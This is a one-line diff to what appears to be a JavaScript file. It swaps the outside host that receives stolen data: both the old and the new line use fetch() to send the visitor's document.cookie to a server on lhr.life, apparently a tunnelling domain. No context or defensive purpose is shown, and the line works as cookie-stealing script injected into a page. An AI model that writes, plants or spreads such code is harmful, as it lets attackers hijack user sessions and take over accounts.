@@ -1,1 +1,1 @@
-fetch('https://710e5e0f1ef52a.lhr.life?c=' + document.cookie);
+fetch('https://6386d66b060538.lhr.life?c=' + document.cookie);
